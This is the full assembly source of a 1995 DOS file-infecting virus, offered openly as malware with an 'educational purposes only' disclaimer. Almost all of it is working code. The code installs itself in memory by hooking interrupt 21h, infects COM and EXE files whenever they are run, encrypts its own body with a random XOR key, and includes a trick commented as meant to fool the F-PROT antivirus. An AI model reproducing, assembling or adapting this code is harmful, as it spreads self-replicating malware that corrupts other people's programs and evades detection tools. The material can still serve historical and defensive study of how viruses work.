;
;	VIRUS05.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of COM/EXE files, encrypted with an
; XOR algorithm. It uses standard interrupt vector calls to install the
; int21h handler.
;
; The virus infects on execute (4b00h).
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model	tiny
	.code
	.startup

VirusSize	equ	EndVirus-BeginVirus
VirusInterrupt	equ	7777h
VirusIdentifier	equ	'fP'

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	mov	ax,es
	add	ax,10h
	add	ax,word ptr cs:[bp+ExeHead+16h]

	push	ax					; Fool F-PROT
	pop	ax

	push	ax
	push	word ptr cs:[bp+ExeHead+14h]

	push	ds
	push	es

	cld
	mov	ax,VirusInterrupt			; Check if in mem
	int	21h
	cmp	ax,VirusIdentifier			; If so - quit!
	je	AlreadyResident

	mov	ah,4ah					; Get #of free paras
	mov	bx,0ffffh				; in bx
	int	21h

	sub	bx,(VirusSize+15)/16+1			; Change..
	mov	ah,4ah
	int	21h

	mov	ah,48h					; ..allocation.
	mov	bx,(VirusSize+15)/16
	int	21h
	jc	AlreadyResident

	dec	ax					; ax-1 = MCB
	mov	es,ax
	mov	word ptr es:[1],8			; Mark DOS as owner

	sub	ax,0fh					; es:100h = alloc mem
	mov	es,ax

	mov	di,100h
	lea	si,[bp+offset BeginVirus]
	mov	cx,VirusSize
	rep	movsb					; Copy virus to mem

	push	es
	pop	ds
	mov	ax,3521h				; Hook old INT21h
	int	21h
	mov	word ptr ds:[Int21o],bx
	mov	word ptr ds:[Int21s],es

	mov	dx,offset Int21hHandler			; Set new INT21h
	mov	ax,2521h
	int	21h

AlreadyResident:
	pop	es
	pop	ds
	cmp	[bp+ComExe],0
	je	RestoreCom

RestoreExe:
	retf						; Return back to program

RestoreCom:
	pop	ax
	pop	ax					; Instead of retf
	mov	di,100h					; Restore first bytes
	lea	si,[bp+OrgBuf]
	mov	cx,3
	rep	movsb

	mov	ax,100h					; Return back to program
	jmp	ax

ComExe	db	0
ExeHead	db	28 dup (0)
OrgBuf	db	0cdh,20h,90h				; Buffer for 3 bytes
NewBuf	db	0e9h,00h,00h				; Buffer for entryjmp

;---------------------------------------------------------------------
;	New interrupt 21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax,VirusInterrupt			; Are we in mem?
	jne	@@next
	mov	ax,VirusIdentifier			; If so return 'fP'
	iret
@@next:	cmp	ax,4b00h				; Check for exec
	je	InfectFileOnExecute

	jmp	OldInt21h

;---------------------------------------------------------------------
;	Infect on execute (4b00h)
;---------------------------------------------------------------------

InfectFileOnExecute:
	push	ax bx cx dx si di bp ds es

	push	cs
	pop	es
	cld

	mov	ax,3D02h				; Open the file..
	int	21h

	mov	bx,ax					; File handle in bx

	push	cs
	pop	ds					; The actual segment

	mov	ax,5700h				; Get date/time
	int	21h
	push	dx
	push	cx

	mov	ah,3fh					; Read three bytes
	mov	cx,3
	mov	dx,offset ds:OrgBuf
	int	21h

	cmp	word ptr ds:OrgBuf,'ZM'			; Check if .EXE file
	je	InfectExeFile
	cmp	word ptr ds:OrgBuf,'MZ'
	je	InfectExeFile

InfectComFile:
	mov	ComExe,0

	mov	al,2h					; Go EOF
	call	SetFilePointer

	add	ax,offset EntryPoint-103h		; Calculate entryjmp
	mov	word ptr ds:NewBuf[1],ax		; Move it to NewBuf

	call	WriteVirus

	xor	al,al					; Go SOF
	call	SetFilePointer

	mov	ah,40h					; Write 3 start bytes
	mov	cx,3
	mov	dx,offset NewBuf
	int	21h

	jmp	CloseFile

InfectExeFile:
	mov	ComExe,1

	xor	al,al					; Go SOF
	call	SetFilePointer

	mov	ah,3fh					; Read header
	mov	cx,1ch
	mov	dx,offset ExeHead
	int	21h

	mov	al,2h					; Go EOF
	call	SetFilePointer

	push	dx
	push	ax

	call	WriteVirus

	mov	al,2h					; Go EOF
	call	SetFilePointer

	mov	cx,200h
	div	cx
	inc	ax
	mov	word ptr ds:[ExeHead+2h],dx
	mov	word ptr ds:[ExeHead+4h],ax

	pop	ax
	pop	dx

	mov	cx,10h
	div	cx
	sub	ax,word ptr ds:[ExeHead+8h]
	mov	word ptr ds:[ExeHead+16h],ax
	mov	word ptr ds:[ExeHead+14h],dx

	mov	word ptr ds:[ExeHead+12h],'RI'

	xor	al,al					; Go SOF
	call	SetFilePointer

	mov	ah,40h					; Write header
	mov	cx,1ch
	mov	dx,offset ExeHead
	int	21h

	jmp	CloseFile

CloseFile:
	push	cs
	pop	ds

	mov	ax,5701h				; Restore date
	pop	cx
	pop	dx
	int	21h

	mov	ah,3eh					; Close file
	int	21h

	pop	es ds bp di si dx cx bx ax

OldInt21h:
	db	0eah					; Jmp to orig int21h
Int21o	dw	?
Int21s	dw	?

;-------------------------------------------------------------------------
;	Helper functions
;-------------------------------------------------------------------------

SetFilePointer:
	mov	ah,42h					; Jump in file
	xor	cx,cx					; This saves a few
	cwd						; bytes as it's used
	int	21h					; a few times
	ret

WriteVirus:
	mov	ah,2ch					; Get random number
	int	21h
	mov	word ptr ds:Key,dx

	mov	ax,08d00h				; Copy virus to mem
	mov	es,ax
	mov	di,100h
	mov	si,di
	mov	cx,(VirusSize+1)/2
	rep	movsw

	push	es
	pop	ds
	xor	bp,bp					; And encrypt it
	call	EncryptDecrypt

	mov	ah,40h					; Write virus to file
	mov	cx,VirusSize
	mov	dx,offset BeginVirus
	int	21h

	push	cs
	pop	ds
	ret

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EncryptDecrypt:
	mov	ax,word ptr ds:[bp+Key]
	mov	cx,(EndEncryptedSection-BeginEncryptedSection)/2
	lea	di,[bp+BeginEncryptedSection]
@@loop:	xor	word ptr ds:[di],ax			; A simple xor loop
	inc	di
	inc	di
	loop	@@loop
	ret
Key	dw	0

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	@@delta
@@delta:pop	bp
	sub	bp,offset @@delta
	push	cs
	pop	ds
	call	EncryptDecrypt				; Decrypt the virus
	jmp	BeginEncryptedSection			; Start it!

EndVirus:

end
